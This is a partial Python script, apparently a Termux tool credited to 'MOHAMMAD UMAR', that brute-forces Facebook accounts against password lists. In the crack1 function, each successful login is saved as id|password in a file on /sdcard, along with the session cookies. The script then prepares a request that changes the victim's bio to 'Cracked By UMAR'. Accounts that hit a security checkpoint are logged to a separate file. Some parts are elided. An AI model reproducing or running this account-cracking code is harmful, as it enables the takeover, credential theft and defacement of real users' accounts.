...
\033[1;97m═════════════════════════════════════════════
[\033[1;92m✔\033[1;97m]OWNER          \033[1;91m: \033[1;97mMOHAMMAD UMAR
...
[\033[1;92m✔\033[1;97m]VERSION        \033[1;91m: \033[38;5;208m0.1
\033[1;97m═════════════════════════════════════════════ """)
def linex():
        print('\x1b[91m══════════════════════════════════════════════')
class jalan:
...
def File():
	...
	print(' \033[1;92m[✔] Saved In UMAR-OK.txt,UMAR-CP.txt')
	linex()
oks=[]
...
def crack1(idf,pwv):
	...
	#sys.stdout.write(f"\r [UMAR] {loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	#sys.stdout.flush()
	sys.stdout.write('\r\033[1;37m [UMAR] %s|\033[1;32mOK:-%s\033[1;37m\r'%(loop,len(oks)));sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				print (' \x1b[1;92m[UMAR-OK] '+idf+'|'+pw)
				open('/sdcard/UMAR-OK.txt','a').write(idf+'|'+pw+'\n')
				try:
					pi = ses.get('https://m.facebook.com/').text
					cookies=ses.cookies.get_dict()
					data ={"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(pi)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(pi)).group(1), 'bio':"Cracked By UMAR (UMAR TERMUX ZONE')"}
				...
				open('/sdcard/UMAR-KOKI.txt','a').write(cokii+'\n')
				
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print (f' \x1b[38;5;208m[UMAR-CP] '+idf+'|'+pw)
				open('/sdcard/UMAR-CP.txt','a').write(idf+'|'+pw+'\n')
				break
